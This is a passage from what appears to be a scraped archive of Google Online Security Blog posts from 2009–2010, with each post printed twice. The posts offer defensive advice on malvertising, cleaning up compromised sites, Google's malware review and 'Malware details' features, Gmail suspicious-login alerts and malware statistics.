malvertising.   What is \"Malvertising?\"  \"Malvertising\" = malware + advertising. Haven't heard of it? The terminology may be new, but we can all understand the concept. Although malware distributors have attempted to spread malware through online ads for years, ever-improving prevention and detection methods have made it unlikely for most Internet users to have encountered a \"bad ad\" firsthand. However, it's important to make sure that you (and your computer) are properly prepared in case you encounter any source of malware on the web &#8212; whether it is an infected ad, a hacked site, a dangerous link, or someone who is pretending to be someone they're not.   Anti-Malvertising.com  We created Anti-Malvertising.com earlier this year as a resource for all members of the online ecosystem. Anti-Malvertising.com contains tips designed for  publishers ,  ad operations teams , and  Internet users  to help protect their websites, networks, and computers.   Tips for Web Publishers: Know Who You're Working With, Perform Comprehensive QA, &amp; Have a Plan in Place  Anti-Malvertising.com includes a  custom search engine  to help individual ad networks, publishers, and ad operations teams conduct quick background checks on prospective advertisers. It indexes a variety of independent, third party sites that track possible attempts to distribute malware through advertising. It is intended to be used as one of the steps in a publisher's background check process.  In some recent cases, infected ads that had already been caught and publicized by security researchers have remained active within some advertising systems. Anti-Malvertising.com's  malvertising research engine  makes it easier for the online advertising and security communities to share information and collaborate to help protect users from emerging threats.  For more detailed guidance on the following tips, visit  http://www.anti-malvertising.com/tips-for-publishers        Pay close attention to all agencies and advertisers with whom you work.  Perform due diligence by thoroughly checking prospective partners' references and credentials.  Perform comprehensive QA on all ad creatives.  Protect your own computer and website from infection.  Be aware that various ad networks and exchanges may have significantly different standards for the prevention and detection of malware. No automatic detection system, however robust, can substitute for your own vigilance. However, we strongly advise against exposing your site to harm by using networks or exchanges without strong anti-malware security measures in place.   Ensure your Ad Operations team has an incident response plan in place (for guidance, visit  http://www.anti-malvertising.com/tips-for-ad-operations ).    Tips for Users: Protect Your Computer, Update Regularly, and Avoid Getting Tricked    Make sure your browser, operating system, software and plugins are all updated regularly (enable auto-updates when possible).  Be aware that malware can be disguised as antivirus/antispyware software in order to trick people into buying or downloading it. Fake (and harmful) software of this kind is known in the web security community as \"rogue security software.\" How to avoid getting tricked? Always research a company's reputation before downloading its software or visiting its website, and be wary of unexpected warnings from products you haven't installed yourself. You can view a list of some legitimate free security scans at  http://www.staysafeonline.org/content/free-security-check-ups .  Exercise caution whenever you're prompted to download an email attachment, follow an instant message link, install a plug-in, or download an unfamiliar piece of software.    Protecting the Free Availability of Online Content  In addition to providing visibility to advertisers, revenue to publishers, and information to users, the online advertising business model also enables anyone with an Internet connection to access an entire world of content for free. By increasing our vigilance as a community, we can help to keep online ads safe and preserve the wide access to information that advertising enables.                                   Posted by Eric Davis, Head of Anti-MalvertisingAs part of Cyber Security Awareness Month, we're highlighting cyber security tips and features to help ensure you're taking the necessary steps to protect your computer, website, and personal information. For general cyber security tips, check out our online security educational series or visit http://www.staysafeonline.org/.At Google, we always aim to provide users with useful, relevant information. Readers of this blog know that we also work hard to detect malicious content on the web and protect users from harm. But did you know that we strive for the same level of relevance, and work equally as hard to protect users, in our online advertising business?The mainstream media has recently picked up on the topic of malvertising (malware-infected advertising). Google's Anti-Malvertising Team works hard in this area and would like to take this time to share some important safety tips. We work closely with the Anti-Malware Team to identify trends and improve automated detection systems. We also educate users, develop policies and act as a liaison between the online security and online advertising communities.Whether you're a web publisher who accepts ads on your website, or a home user who enjoys browsing the wide variety of advertising-supported content available on the web, we expect the resources below will help protect you from malvertising.What is \"Malvertising?\"\"Malvertising\" = malware + advertising. Haven't heard of it? The terminology may be new, but we can all understand the concept. Although malware distributors have attempted to spread malware through online ads for years, ever-improving prevention and detection methods have made it unlikely for most Internet users to have encountered a \"bad ad\" firsthand. However, it's important to make sure that you (and your computer) are properly prepared in case you encounter any source of malware on the web — whether it is an infected ad, a hacked site, a dangerous link, or someone who is pretending to be someone they're not.Anti-Malvertising.comWe created Anti-Malvertising.com earlier this year as a resource for all members of the online ecosystem. Anti-Malvertising.com contains tips designed for publishers, ad operations teams, and Internet users to help protect their websites, networks, and computers.Tips for Web Publishers: Know Who You're Working With, Perform Comprehensive QA, & Have a Plan in PlaceAnti-Malvertising.com includes a custom search engine to help individual ad networks, publishers, and ad operations teams conduct quick background checks on prospective advertisers. It indexes a variety of independent, third party sites that track possible attempts to distribute malware through advertising. It is intended to be used as one of the steps in a publisher's background check process.In some recent cases, infected ads that had already been caught and publicized by security researchers have remained active within some advertising systems. Anti-Malvertising.com's malvertising research engine makes it easier for the online advertising and security communities to share information and collaborate to help protect users from emerging threats.For more detailed guidance on the following tips, visit http://www.anti-malvertising.com/tips-for-publishers    Pay close attention to all agencies and advertisers with whom you work.Perform due diligence by thoroughly checking prospective partners' references and credentials.Perform comprehensive QA on all ad creatives.Protect your own computer and website from infection.Be aware that various ad networks and exchanges may have significantly different standards for the prevention and detection of malware. No automatic detection system, however robust, can substitute for your own vigilance. However, we strongly advise against exposing your site to harm by using networks or exchanges without strong anti-malware security measures in place. Ensure your Ad Operations team has an incident response plan in place (for guidance, visit http://www.anti-malvertising.com/tips-for-ad-operations).Tips for Users: Protect Your Computer, Update Regularly, and Avoid Getting TrickedMake sure your browser, operating system, software and plugins are all updated regularly (enable auto-updates when possible).Be aware that malware can be disguised as antivirus/antispyware software in order to trick people into buying or downloading it. Fake (and harmful) software of this kind is known in the web security community as \"rogue security software.\" How to avoid getting tricked? Always research a company's reputation before downloading its software or visiting its website, and be wary of unexpected warnings from products you haven't installed yourself. You can view a list of some legitimate free security scans at http://www.staysafeonline.org/content/free-security-check-ups.Exercise caution whenever you're prompted to download an email attachment, follow an instant message link, install a plug-in, or download an unfamiliar piece of software.Protecting the Free Availability of Online ContentIn addition to providing visibility to advertisers, revenue to publishers, and information to users, the online advertising business model also enables anyone with an Internet connection to access an entire world of content for free. By increasing our vigilance as a community, we can help to keep online ads safe and preserve the wide access to information that advertising enables.     ", "date": "October 16, 2009"},
{"website": "Google-Security", "title": "\nThe Malware Warning Review Process\n", "author": ["written by Lucas Ballard and Ke Wang, Anti-Malware Team"], "link": "https://security.googleblog.com/2009/10/malware-warning-review-process.html", "abstract": "                             written by Lucas Ballard and Ke Wang, Anti-Malware Team    As part of Cyber Security Awareness Month, Google's Anti-Malware Team is publishing a series of educational blog posts inspired by  questions we've received from users . October is a great time to brush up on cyber security tips and ensure you're taking the necessary steps to protect your computer, website, and personal information. For general cyber security tips, check out  our online security educational series  or visit  http://www.staysafeonline.org/ . To learn more about malware detection and site cleanup, visit the  Webmaster Tools Help Center  and  Forum .   Google's anti-malware efforts are designed to be helpful to both webmasters and website visitors. Google continuously scans our web index for pages that could be dangerous to site visitors. When we find such pages, we flag them as harmful in our search results, and also provide this data to several browsers so that users of these browsers will receive warnings directly. We undertake this process as part of our security philosophy: we believe that if we all work together to identify threats and stamp them out, we can make the web a safer place for everyone. While we believe these processes are important steps in helping to protect our users, we also understand the frustration felt by the webmasters of flagged sites. This is why we notify webmasters as soon as we discover that their sites have been compromised. Additionally, we provide webmasters with a  tool to file a review  once they have cleaned their site. The review process works as follows.   Part 1: The webmaster's job:  The first step is site cleanup. The webmaster should remove all harmful content from the site. We realize that it can be tricky to find all the infections on a website, and webmasters should look thoroughly if the warning label persists. Keep in mind that if your site contains elements from another website that may have been compromised, it will remain flagged. This is because your site could still introduce harm to visitors. To prevent reinfection, the webmaster should also identify and fix the underlying software vulnerability that led to site compromise in the first place. For a guide on how to do this, visit  stopbadware.org/home/security .  Once a webmaster has cleaned up the site, a Malware Review can be filed with Google's Webmaster Tools (please note that a Malware Review request is not the same as an  Index Reinclusion request ).  The process for Malware Review is as follows:   Log in to  Webmaster Tools .  From the Tool's home page click on the link to the site that is being flagged.  This will bring you to the site's Dashboard.  There should be a large red banner across the top of the dashboard that says \"This site may be distributing malware.\" Clicking on the link that says \"More Details\" expands the dashboard to reveal a list of pages on the site that were found to be malicious.  Below this list is a link that says \"Request a review.\" A webmaster can fill out this form and click the \"Request a review\" button to initiate the review process.   More detailed instructions can be found here .    Part 2: Our job:  Upon receiving a Malware Review request, an automated set of algorithms verifies that the site has been cleaned. These algorithms revisit a subset of both the malicious and non-malicious pages that were scanned when the site was originally flagged. Additionally, these algorithms test some pages that were not originally scanned. If none of the tested pages are found to be malicious, the site is deemed to be safe, and warnings are removed from search results. A typical appeal takes only several hours to complete, although in some cases the process may take up to one day.  In addition to processing appeal requests from webmasters, we also rescan compromised sites periodically.   We encourage webmasters of infected sites to quickly clean their web pages and proactively request reviews through Webmaster Tools. After the site has been thoroughly cleaned and reviewed, it will no longer show a warning on Google's search results pages or through the browsers making use of our data.                                   written by Lucas Ballard and Ke Wang, Anti-Malware TeamAs part of Cyber Security Awareness Month, Google's Anti-Malware Team is publishing a series of educational blog posts inspired by questions we've received from users. October is a great time to brush up on cyber security tips and ensure you're taking the necessary steps to protect your computer, website, and personal information. For general cyber security tips, check out our online security educational series or visit http://www.staysafeonline.org/. To learn more about malware detection and site cleanup, visit the Webmaster Tools Help Center and Forum.Google's anti-malware efforts are designed to be helpful to both webmasters and website visitors. Google continuously scans our web index for pages that could be dangerous to site visitors. When we find such pages, we flag them as harmful in our search results, and also provide this data to several browsers so that users of these browsers will receive warnings directly. We undertake this process as part of our security philosophy: we believe that if we all work together to identify threats and stamp them out, we can make the web a safer place for everyone. While we believe these processes are important steps in helping to protect our users, we also understand the frustration felt by the webmasters of flagged sites. This is why we notify webmasters as soon as we discover that their sites have been compromised. Additionally, we provide webmasters with a tool to file a review once they have cleaned their site. The review process works as follows.Part 1: The webmaster's job: The first step is site cleanup. The webmaster should remove all harmful content from the site. We realize that it can be tricky to find all the infections on a website, and webmasters should look thoroughly if the warning label persists. Keep in mind that if your site contains elements from another website that may have been compromised, it will remain flagged. This is because your site could still introduce harm to visitors. To prevent reinfection, the webmaster should also identify and fix the underlying software vulnerability that led to site compromise in the first place. For a guide on how to do this, visit stopbadware.org/home/security.Once a webmaster has cleaned up the site, a Malware Review can be filed with Google's Webmaster Tools (please note that a Malware Review request is not the same as an Index Reinclusion request).  The process for Malware Review is as follows:Log in to Webmaster Tools.From the Tool's home page click on the link to the site that is being flagged.  This will bring you to the site's Dashboard.There should be a large red banner across the top of the dashboard that says \"This site may be distributing malware.\" Clicking on the link that says \"More Details\" expands the dashboard to reveal a list of pages on the site that were found to be malicious.Below this list is a link that says \"Request a review.\" A webmaster can fill out this form and click the \"Request a review\" button to initiate the review process.More detailed instructions can be found here.Part 2: Our job: Upon receiving a Malware Review request, an automated set of algorithms verifies that the site has been cleaned. These algorithms revisit a subset of both the malicious and non-malicious pages that were scanned when the site was originally flagged. Additionally, these algorithms test some pages that were not originally scanned. If none of the tested pages are found to be malicious, the site is deemed to be safe, and warnings are removed from search results. A typical appeal takes only several hours to complete, although in some cases the process may take up to one day.In addition to processing appeal requests from webmasters, we also rescan compromised sites periodically. We encourage webmasters of infected sites to quickly clean their web pages and proactively request reviews through Webmaster Tools. After the site has been thoroughly cleaned and reviewed, it will no longer show a warning on Google's search results pages or through the browsers making use of our data.     ", "date": "October 9, 2009"},
{"website": "Google-Security", "title": "\nImproving web browser security\n", "author": ["Posted by Chris Evans, Security Team"], "link": "https://security.googleblog.com/2009/07/improving-web-browser-security.html", "abstract": "                             Posted by Chris Evans, Security Team   Malware is the source of a large number of reported security incidents on the Internet. Since Internet users can become infected in many different ways, the proliferation of malware is a very hard problem to solve. One part of the solution is to improve the robustness of web browsers such that security compromises due to browser bugs are minimized. We work hard to scrutinize our own code for potential vulnerabilities. We also contribute to research in this area with projects like the  Browser Security Handbook  and open source releases of the&nbsp; fuzzers &nbsp; involved  in our software testing.  Some of you may have noticed that while working on Google Chrome, we have also discovered and responsibly reported a number of security issues in other browsers. Various scenarios lead us to report these bugs:    Some browsers share code bases with Google Chrome, and we collaborate with those browser vendors.  We develop generic fuzzers that are applicable to most browsers and that we want to share with others.  We spend time analyzing behavior in different browsers, and we sometimes discover bugs in the process.  It benefits our users and the Internet as a whole if we work collaboratively on better web browser security.     A few of the more interesting bugs we've researched recently include:  this one in Opera  uncovered by Michal Zalewski's &lt;canvas&gt; fuzzer; a&nbsp; HTTP 449 response code issue in IE  found by Tavis Ormandy;  contributions to Safari 4's security  by Robert Swiecki, SkyLined, and Dean McNamee (and others); an  XMLHttpRequest leak &nbsp;in Firefox discovered by Marius Schilder; and a&nbsp; cross-domain leak  in Chrome / Safari (the two share a common base) unearthed by Chris Evans.  The collaboration works both ways. We'd like to thank the following browser vendors: Microsoft for helping with  SSL interactions with HTTP proxies , Mozilla for  sharing fuzzers , and  Apple  for sharing and coordinating Webkit-based bugs.  Together as a security community, our combined efforts to find vulnerabilities in browsers, practice responsible disclosure, and get problems fixed before criminals exploit them help make the Internet an overall safer place for everyone. We'd also like to thank all those who have helped us by contributing to Google Chrome.                                   Posted by Chris Evans, Security TeamMalware is the source of a large number of reported security incidents on the Internet. Since Internet users can become infected in many different ways, the proliferation of malware is a very hard problem to solve. One part of the solution is to improve the robustness of web browsers such that security compromises due to browser bugs are minimized. We work hard to scrutinize our own code for potential vulnerabilities. We also contribute to research in this area with projects like the Browser Security Handbook and open source releases of the fuzzers involved in our software testing.Some of you may have noticed that while working on Google Chrome, we have also discovered and responsibly reported a number of security issues in other browsers. Various scenarios lead us to report these bugs:Some browsers share code bases with Google Chrome, and we collaborate with those browser vendors.We develop generic fuzzers that are applicable to most browsers and that we want to share with others.We spend time analyzing behavior in different browsers, and we sometimes discover bugs in the process.It benefits our users and the Internet as a whole if we work collaboratively on better web browser security.A few of the more interesting bugs we've researched recently include: this one in Opera uncovered by Michal Zalewski's   fuzzer; a HTTP 449 response code issue in IE found by Tavis Ormandy; contributions to Safari 4's security by Robert Swiecki, SkyLined, and Dean McNamee (and others); an XMLHttpRequest leak in Firefox discovered by Marius Schilder; and a cross-domain leak in Chrome / Safari (the two share a common base) unearthed by Chris Evans.The collaboration works both ways. We'd like to thank the following browser vendors:Microsoft for helping with SSL interactions with HTTP proxies, Mozilla for sharing fuzzers, and Apple for sharing and coordinating Webkit-based bugs.Together as a security community, our combined efforts to find vulnerabilities in browsers, practice responsible disclosure, and get problems fixed before criminals exploit them help make the Internet an overall safer place for everyone. We'd also like to thank all those who have helped us by contributing to Google Chrome.     ", "date": "July 22, 2009"},
{"website": "Google-Security", "title": "\nBest Practices for Verifying and Cleaning up a Compromised Site\n", "author": ["Written by Panayiotis Mavrommatis, Security Team "], "link": "https://security.googleblog.com/2009/10/best-practices-for-verifying-and.html", "abstract": "                             Written by Panayiotis Mavrommatis, Security Team     As part of Cyber Security Awareness Month, Google's Anti-Malware Team is publishing a series of educational blog posts inspired by  questions we've received from users . October is a great time to brush up on cyber security tips and ensure you're taking the necessary steps to protect your computer, website, and personal information. For general cyber security tips, check out  our online security educational series  or visit  http://www.staysafeonline.org/ . To learn more about malware detection and site cleanup, visit the  Webmaster Tools Help Center  and  Forum .   In our  last post  in this series, we explained Google's malware scanning process and how malware warning reviews work. It's not always clear to webmasters how to go about cleaning up their sites once they've been compromised, so this time we thought we'd share some best practices.    1) Verify Your Site with Google Webmaster Tools   If you have  added and verified your site's ownership  with Google Webmaster Tools, you can view a partial list of URLs where our system has detected suspicious content on your site, as well as  samples of the malicious code . Once you've thoroughly cleaned up your site and addressed the vulnerability that allowed it to be compromised, it's easy to request a review through Webmaster Tools. We recognize that some site owners may want to use these tools even if they haven't already signed up with Webmaster Tools. For that reason, we enable you to verify ownership of your sites at any time, even if our systems have listed them as potentially dangerous.   2) If Your Site Has Been Compromised, Perform a Comprehensive Cleanup   If any part of your site has been compromised, thoroughly check all pages on the site for harmful code or content &#8212; not just the example  pages listed in Webmaster Tools . Be sure to identify and address the underlying vulnerability that led to the compromise, or else reinfection is likely to occur.   Remember to Check Your Web Server Configuration   In addition to checking the contents of your site's pages and web server source code, remember to check that your web server configuration has not been modified by any intruders. If your web server has been compromised, your site's error pages can be modified to include custom HTML that actually redirects visitors to malicious sites.   Deleted &amp; Error Pages: Dark Corners of Your Website Where Malware May Be Lurking   When a page is deleted from a site, the web server returns an error code (usually 404: Not Found) when requests to the \"deleted\" URLs are made. In addition to the error code in the HTTP header, the web server may send a custom error page or \"Not Found\" page, usually intended to help users find what they are looking for. If your site is infected, its error page can contain arbitrary HTML that exposes your visitors to malware. You can search our Webmaster Forum for information about how others are dealing with  similar problems . The recently-launched malware samples feature in Google Webmaster Tools could also come in handy.   3) If You Switch Hosting Providers, Disable Access to the Old Version of Your Site   When a site is moved to a different hosting provider, the DNS records are updated such that the domain name points to a new IP address. In some cases, DNS caching can cause your domain name to continue resolving to the old IP address for some visitors even after the site has moved. For this reason, we recommend instructing your former hosting provider to stop serving any content for your site. This may cause some visitors to experience server errors for a few hours, but can protect them from visiting a potentially dangerous web server.   As always, our  Webmaster Forum  and StopBadware's  BadwareBusters  can be good sources of help and information when cleaning up a compromised site.                                   Written by Panayiotis Mavrommatis, Security Team As part of Cyber Security Awareness Month, Google's Anti-Malware Team is publishing a series of educational blog posts inspired by questions we've received from users. October is a great time to brush up on cyber security tips and ensure you're taking the necessary steps to protect your computer, website, and personal information. For general cyber security tips, check out our online security educational series or visit http://www.staysafeonline.org/. To learn more about malware detection and site cleanup, visit the Webmaster Tools Help Center and Forum.In our last post in this series, we explained Google's malware scanning process and how malware warning reviews work. It's not always clear to webmasters how to go about cleaning up their sites once they've been compromised, so this time we thought we'd share some best practices.1) Verify Your Site with Google Webmaster ToolsIf you have added and verified your site's ownership with Google Webmaster Tools, you can view a partial list of URLs where our system has detected suspicious content on your site, as well as samples of the malicious code. Once you've thoroughly cleaned up your site and addressed the vulnerability that allowed it to be compromised, it's easy to request a review through Webmaster Tools. We recognize that some site owners may want to use these tools even if they haven't already signed up with Webmaster Tools. For that reason, we enable you to verify ownership of your sites at any time, even if our systems have listed them as potentially dangerous.2) If Your Site Has Been Compromised, Perform a Comprehensive CleanupIf any part of your site has been compromised, thoroughly check all pages on the site for harmful code or content — not just the example pages listed in Webmaster Tools. Be sure to identify and address the underlying vulnerability that led to the compromise, or else reinfection is likely to occur.Remember to Check Your Web Server ConfigurationIn addition to checking the contents of your site's pages and web server source code, remember to check that your web server configuration has not been modified by any intruders. If your web server has been compromised, your site's error pages can be modified to include custom HTML that actually redirects visitors to malicious sites.Deleted & Error Pages: Dark Corners of Your Website Where Malware May Be LurkingWhen a page is deleted from a site, the web server returns an error code (usually 404: Not Found) when requests to the \"deleted\" URLs are made. In addition to the error code in the HTTP header, the web server may send a custom error page or \"Not Found\" page, usually intended to help users find what they are looking for. If your site is infected, its error page can contain arbitrary HTML that exposes your visitors to malware. You can search our Webmaster Forum for information about how others are dealing with similar problems. The recently-launched malware samples feature in Google Webmaster Tools could also come in handy.3) If You Switch Hosting Providers, Disable Access to the Old Version of Your SiteWhen a site is moved to a different hosting provider, the DNS records are updated such that the domain name points to a new IP address. In some cases, DNS caching can cause your domain name to continue resolving to the old IP address for some visitors even after the site has moved. For this reason, we recommend instructing your former hosting provider to stop serving any content for your site. This may cause some visitors to experience server errors for a few hours, but can protect them from visiting a potentially dangerous web server.As always, our Webmaster Forum and StopBadware's BadwareBusters can be good sources of help and information when cleaning up a compromised site.     ", "date": "October 22, 2009"},
{"website": "Google-Security", "title": "\nDetecting suspicious account activity\n", "author": ["Posted by Pavni Diwanji, Engineering Director"], "link": "https://security.googleblog.com/2010/03/detecting-suspicious-account-activity.html", "abstract": "                            (Cross-posted from the  Gmail Blog )   Posted by Pavni Diwanji, Engineering Director   A few weeks ago, I got an email presumably from a friend stuck in London asking for some money to help him out. It turned out that the email was sent by a scammer who had hijacked my friend's account. By reading his email, the scammer had figured out my friend's whereabouts and was emailing all of his contacts. Here at Google, we work hard to protect Gmail accounts against this kind of abuse. Today we're introducing a new feature to notify you when we detect suspicious login activity on your account.  You may remember that a while back we launched  remote sign out and information about recent account activity  to help you understand and manage your account usage. This information is still at the bottom of your inbox. Now, if it looks like something unusual is going on with your account, we&#8217;ll also alert you by posting a warning message saying, \"Warning: We believe your account was last accessed from&#8230;\" along with the geographic region that we can best associate with the access.      To determine when to display this message, our automated system matches the relevant  IP address , logged per the  Gmail privacy policy , to a broad geographical location. While we don't have the capability to determine the specific location from which an account is accessed, a login appearing to come from one country and occurring a few hours after a login from another country may trigger an alert.  By clicking on the \"Details\" link next to the message, you'll see the last account activity window that you're used to, along with the most recent access points.       If you think your account has been compromised, you can change your password from the same window. Or, if you know it was legitimate access (e.g. you were traveling, your husband/wife who accesses the account was also traveling, etc.), you can click \"Dismiss\" to remove the message.  Keep in mind that these notifications are meant to alert you of suspicious activity but are not a replacement for account security best practices. If you'd like more information on account security, read these tips on  keeping your information secure  or visit the  Google Online Security Blog .  Finally, we know that security is also a top priority for businesses and schools, and we look forward to offering this feature to Google Apps customers once we have gathered and incorporated their feedback.                                   (Cross-posted from the Gmail Blog)Posted by Pavni Diwanji, Engineering DirectorA few weeks ago, I got an email presumably from a friend stuck in London asking for some money to help him out. It turned out that the email was sent by a scammer who had hijacked my friend's account. By reading his email, the scammer had figured out my friend's whereabouts and was emailing all of his contacts. Here at Google, we work hard to protect Gmail accounts against this kind of abuse. Today we're introducing a new feature to notify you when we detect suspicious login activity on your account.You may remember that a while back we launched remote sign out and information about recent account activity to help you understand and manage your account usage. This information is still at the bottom of your inbox. Now, if it looks like something unusual is going on with your account, we’ll also alert you by posting a warning message saying, \"Warning: We believe your account was last accessed from…\" along with the geographic region that we can best associate with the access.To determine when to display this message, our automated system matches the relevant IP address, logged per the Gmail privacy policy, to a broad geographical location. While we don't have the capability to determine the specific location from which an account is accessed, a login appearing to come from one country and occurring a few hours after a login from another country may trigger an alert.By clicking on the \"Details\" link next to the message, you'll see the last account activity window that you're used to, along with the most recent access points. If you think your account has been compromised, you can change your password from the same window. Or, if you know it was legitimate access (e.g. you were traveling, your husband/wife who accesses the account was also traveling, etc.), you can click \"Dismiss\" to remove the message.Keep in mind that these notifications are meant to alert you of suspicious activity but are not a replacement for account security best practices. If you'd like more information on account security, read these tips on keeping your information secure or visit the Google Online Security Blog.Finally, we know that security is also a top priority for businesses and schools, and we look forward to offering this feature to Google Apps customers once we have gathered and incorporated their feedback.     ", "date": "March 24, 2010"},
{"website": "Google-Security", "title": "\nShow Me the Malware!\n", "author": ["written by Lucas Ballard, on behalf of the Anti-Malware, Anti-Malvertising, and Webmaster Tools teams"], "link": "https://security.googleblog.com/2009/10/show-me-malware.html", "abstract": "                              written by Lucas Ballard, on behalf of the Anti-Malware, Anti-Malvertising, and Webmaster Tools teams    As part of Cyber Security Awareness Month, we're highlighting cyber security tips and features to help ensure you're taking the necessary steps to protect your computer, website, and personal information. For general cyber security tips, check out  our online security educational series  or visit  http://www.staysafeonline.org/ . To learn more about malware detection and site cleanup, visit the  Webmaster Tools Help Center  and  Forum .   To help protect users against malware threats, Google has built  automated scanners  that detect malware on websites we've indexed. Pages that are identified as dangerous by these scanners are accompanied by warnings in Google search results, and browsers such as Google Chrome, Firefox, and Safari also use our data to show similar warnings to people attempting to visit suspicious sites.  While it is important to protect users, we also know that most of these sites are not intentionally distributing malware. We understand the frustration of webmasters whose sites have been compromised without their knowledge and who discover that their site has been flagged. We proactively offer help to these webmasters: we send email to site administrators when we encounter suspicious content, we provide a list of infected pages in Webmaster Tools, and we maintain a service that allows webmasters to notify us when they have cleaned their sites. Read more about this process in the  previous post  on this blog.  We're happy to announce that we've launched a feature that enables Google to provide even more detailed help to webmasters. Webmaster Tools now provides webmasters with samples of the malicious code that Google's automated scanners detected on their sites. These samples &#8212; which typically take the form of injected HTML tags, JavaScript, or embedded Flash files &#8212; are available in the \"Malware details\"  Labs feature  in  Webmaster Tools . (  UPDATE:  The 'Malware details' feature graduated from Labs and is now part of the default Webmaster Tools interface. You can access it in the regular menu under 'Diagnostics'). Registered webmasters (registration is free) of infected sites do not need to specially enable the feature &#8212; they will find links to it on the Webmaster Tools dashboard. Webmasters will see a list of their pages that we found to be involved in malware distribution and samples of the malicious content that Google's scanners encountered on each infected page. In certain situations we can identify the underlying cause of the malicious code, and we'll provide these details when possible. We hope that the additional information will assist webmasters and help prevent their visitors from being exposed to malware.       Malware details for your site         Malware details for a particular page    While we're excited to offer this feature, we caution webmasters to use the tool only as a starting point in their site clean-up process. Google's scanners may not be able to provide malware samples in all cases, and the malware samples may not be a complete list of all the malware on the page. More importantly, we advise against simply removing the examples that are displayed in Webmaster Tools. If the underlying vulnerability is not identified and patched, it is likely that the site will be compromised again.  In addition to helping the webmasters of sites with malware warnings, this new detail is also designed to promote the general health of the web. In some cases, our automatic scanners find questionable content on a site but do not have enough data to add it to the malware list. The new \"Malware details\" feature will highlight these instances to webmasters early on to help them identify and address security vulnerabilities more quickly.  We hope you never have cause to use this feature, but if you do, it should help you quickly purge malware from your site and help protect its visitors.  We plan to improve our algorithms in the upcoming months to provide even greater coverage, more accurate vulnerability identification, and faster delivery to webmasters.                                   written by Lucas Ballard, on behalf of the Anti-Malware, Anti-Malvertising, and Webmaster Tools teamsAs part of Cyber Security Awareness Month, we're highlighting cyber security tips and features to help ensure you're taking the necessary steps to protect your computer, website, and personal information. For general cyber security tips, check out our online security educational series or visit http://www.staysafeonline.org/. To learn more about malware detection and site cleanup, visit the Webmaster Tools Help Center and Forum.To help protect users against malware threats, Google has built automated scanners that detect malware on websites we've indexed. Pages that are identified as dangerous by these scanners are accompanied by warnings in Google search results, and browsers such as Google Chrome, Firefox, and Safari also use our data to show similar warnings to people attempting to visit suspicious sites.While it is important to protect users, we also know that most of these sites are not intentionally distributing malware. We understand the frustration of webmasters whose sites have been compromised without their knowledge and who discover that their site has been flagged. We proactively offer help to these webmasters: we send email to site administrators when we encounter suspicious content, we provide a list of infected pages in Webmaster Tools, and we maintain a service that allows webmasters to notify us when they have cleaned their sites. Read more about this process in the previous post on this blog.We're happy to announce that we've launched a feature that enables Google to provide even more detailed help to webmasters. Webmaster Tools now provides webmasters with samples of the malicious code that Google's automated scanners detected on their sites. These samples — which typically take the form of injected HTML tags, JavaScript, or embedded Flash files — are available in the \"Malware details\" Labs feature in Webmaster Tools. (UPDATE: The 'Malware details' feature graduated from Labs and is now part of the default Webmaster Tools interface. You can access it in the regular menu under 'Diagnostics'). Registered webmasters (registration is free) of infected sites do not need to specially enable the feature — they will find links to it on the Webmaster Tools dashboard. Webmasters will see a list of their pages that we found to be involved in malware distribution and samples of the malicious content that Google's scanners encountered on each infected page. In certain situations we can identify the underlying cause of the malicious code, and we'll provide these details when possible. We hope that the additional information will assist webmasters and help prevent their visitors from being exposed to malware.Malware details for your siteMalware details for a particular pageWhile we're excited to offer this feature, we caution webmasters to use the tool only as a starting point in their site clean-up process. Google's scanners may not be able to provide malware samples in all cases, and the malware samples may not be a complete list of all the malware on the page. More importantly, we advise against simply removing the examples that are displayed in Webmaster Tools. If the underlying vulnerability is not identified and patched, it is likely that the site will be compromised again.In addition to helping the webmasters of sites with malware warnings, this new detail is also designed to promote the general health of the web. In some cases, our automatic scanners find questionable content on a site but do not have enough data to add it to the malware list. The new \"Malware details\" feature will highlight these instances to webmasters early on to help them identify and address security vulnerabilities more quickly.We hope you never have cause to use this feature, but if you do, it should help you quickly purge malware from your site and help protect its visitors.  We plan to improve our algorithms in the upcoming months to provide even greater coverage, more accurate vulnerability identification, and faster delivery to webmasters.     ", "date": "October 12, 2009"},
{"website": "Google-Security", "title": "\nMalware Statistics Update\n", "author": ["Posted by Niels Provos, Security Team"], "link": "https://security.googleblog.com/2009/08/malware-statistics-update.html", "abstract": "                             Posted by Niels Provos, Security Team   Every now and then people ask us for an update on the malware statistics we published in the  All Your iFrames Point To Us  blog post. We're glad to share this sort of data because we believe that collaboration and information sharing are crucial in driving anti-malware efforts forward. Here is a small update containing some interesting trends we've observed over the last 12 months.   Number of Entries on the Google Safe Browsing Malware List      As we mentioned in our  Top-10 Malware Sites  blog post, we have seen a large increase in the number of compromised sites since April. The number of entries on our malware list has more than doubled in one year, and we have seen periods in which 40,000 web sites were compromised per week. However, compared to infections associated with Gumblar and Martuz &#8212; two relatively large and well-known pieces of malicious code, many compromised web sites now point to hundreds of different domains. As these malware trends evolve, we're constantly improving our systems to better detect compromised web sites. The increase in compromised sites we observed may have also been influenced by our improved detection capabilities.   Search Results Containing a URL Labeled as Harmful      The above graph shows the percentage of daily queries that contain at least one search result  that we labeled as harmful . In January 2008, more than 1.2% of all Google search queries contained at least one such result (you can review a graph of this data in the aforementioned  All Your iFrames Point To Us  post). Since then, there has been a downward trend to well below 1%. We noticed an increase around May 2009, and that growth may be due to the appearance of a larger number of compromised web sites. That said, it's encouraging that compared to last year, fewer search queries contain results to potentially harmful sites.  Users of Google search, Google Chrome, Mozilla Firefox and Apple Safari receive warnings when visiting sites we identify as potentially harmful. These warnings are produced by our  Safe Browsing API , a technology that is freely available for webmasters to implement.                                   Posted by Niels Provos, Security TeamEvery now and then people ask us for an update on the malware statistics we published in the All Your iFrames Point To Us blog post. We're glad to share this sort of data because we believe that collaboration and information sharing are crucial in driving anti-malware efforts forward. Here is a small update containing some interesting trends we've observed over the last 12 months.Number of Entries on the Google Safe Browsing Malware ListAs we mentioned in our Top-10 Malware Sites blog post, we have seen a large increase in the number of compromised sites since April. The number of entries on our malware list has more than doubled in one year, and we have seen periods in which 40,000 web sites were compromised per week. However, compared to infections associated with Gumblar and Martuz — two relatively large and well-known pieces of malicious code, many compromised web sites now point to hundreds of different domains. As these malware trends evolve, we're constantly improving our systems to better detect compromised web sites. The increase in compromised sites we observed may have also been influenced by our improved detection capabilities.Search Results Containing a URL Labeled as HarmfulThe above graph shows the percentage of daily queries that contain at least one search result that we labeled as harmful. In January 2008, more than 1.2% of all Google search queries contained at least one such result (you can review a graph of this data in the aforementioned All Your iFrames Point To Us post). Since then, there has been a downward trend to well below 1%. We noticed an increase around May 2009, and that growth may be due to the appearance of a larger number of compromised web sites. That said, it's encouraging that compared to last year, 